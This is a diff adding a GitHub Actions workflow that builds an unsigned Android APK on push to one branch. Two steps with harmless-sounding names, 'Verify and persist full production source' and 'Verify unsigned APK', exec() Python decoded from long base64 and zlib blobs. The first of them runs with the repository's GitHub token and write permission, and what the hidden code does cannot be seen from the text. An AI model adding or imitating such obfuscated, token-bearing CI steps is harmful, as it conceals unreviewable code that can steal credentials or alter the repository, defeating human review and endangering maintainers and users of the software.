@@ -1,0 +1,61 @@
+name: Recorder power v3
+permissions:
+  contents: write
+  packages: read
+concurrency:
+  group: recorder-power-v3
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: macos-15-intel
+    timeout-minutes: 45
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        fetch-depth: 0
+        persist-credentials: false
+    - uses: actions/setup-java@v4
+      with:
+        distribution: temurin
+        java-version: '25'
+    - name: Verify and persist full production source
+      env:
+        GIT_TOKEN: ${{ github.token }}
+        GIT_ACTOR: ${{ github.actor }}
+      run: 'python3 - <<''PY''
+
+        import base64,zlib
+
+        exec(zlib.decompress(base64.b64decode(''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'')))
+
+        PY
+
+        '
+    - name: Assemble unsigned release
+      env:
+        GIT_TOKEN: ${{ github.token }}
+        GIT_ACTOR: ${{ github.actor }}
+      run: ./gradlew :app:assembleRelease --no-daemon --stacktrace
+    - name: Verify unsigned APK
+      run: 'python3 - <<''PY''
+
+        import base64,zlib
+
+        exec(zlib.decompress(base64.b64decode(''eNp1VG1vIjcQ/r6/wvfJdlkMoU0qJXIl7oAGRUAUSKWWIGTWBnxZbMv2Xkh+fce7XF6uVyTYWeaZ12dm9MFZH5EN+ddgTb4XYV/qTR6qjfO2UCHkL9ptdalyr/Kwr6Ius623B+RETEikGwe38JrZKvIkECx81FtRxIDplTZby5N3VlohAyEA6+BNpUvZTjqWdJgyr4RcR3WMhNJMuMfASx0iOTl0rlObdMDaVTF0ANHxqlQiqGS8K+2G4F8Y/I0pvRIhKEirVIYkV5Tzs8zxJC67qyspouCuibh5jioQehXkY5O8DUyZb9pDwjsVCe5PB3ez8WB9PZsMMUXWozfE8lU7H9ys72azBV7RLFpbBh6gL0oSAo6/l1srINtTsqmGoHdGeUzzR/XMS3HYSIHcZaxcqchBOKJNhNazrTZSlCXx+EG2cO6YE16ZyIw4KAqfrOBvnDFfGbIM0ZM64LJ9tqI5/qa83j7jHLfbIG4s9C1PGEdXeSFcrLxaN83lC1+pPFFRSzRrKHvNtt24YvEYoZgnr6NqiCtYiBKwrVpQ3gORDREFNBsimMJKBVwgYSQieDAbztF0tkB/De/Go78x0gb9x0fqOJ7oELTZoclw0W+Pp6POpD8dj4bzBZuMfm5GM8UTz8yn3pENvr15OHbP4XuB84M4km6epiNBaPvi/Pz897exUX/wbp2iavV6LaCApZk/jUqyWIKie5m0qxyXOsYShpDzV4dZIfnPzc4ukln3ndn3oDWgkG1AFHL1iW9w//YGzfUOfS5t8Yh+6+HsScc9Om0k+0e7ETyBQCQCernM0MnTC4OAEWCEIh3Q1BpVV4P7Rnqr5UQYvQUEOx7Kunkv9RzV60ZfvRgb0dKgLbTf/AhCeosMq5xTnlBoOOx7SLkR/EoQrEqK+YZSRjYYgtndvA+DyAbNY/gl/c5HsLirLAXh+PoZjL4oKM+3vSqsB0rbzj6l4fu1XZl6EGW97VfNWWKFdc894vI0q/VaZPV1qRw0VqUrwNO/OQjrsBe98wt+unaseW2YY3t1lHqnUpV5vbXrUBWFUlLJZi9gudZa8vdH4M/x4vr+8/rufroeD9IF+L8b925X6osoq4MLJCFyGFJYaN6jLfwA0JOL+XUfUpvfT+YfrTFmX6025IcSPt60D8W0MEK45WoS6xA1sy4xe7pUEJBBAC810FVT7JgO6zRrpCGzsf7EP6RF/wU3mBxI'')))
+
+        PY
+
+        '
+    - uses: actions/upload-artifact@v4
+      if: always()
+      with:
+        name: HyperCeiler-recorder-power-v3-unsigned
+        path: artifacts/
+        if-no-files-found: error
+'on':
+  push:
+    branches:
+    - kernout-patch-1
+    paths:
+    - .github/workflows/recorder-power-v3-build.yml
+  workflow_dispatch: null
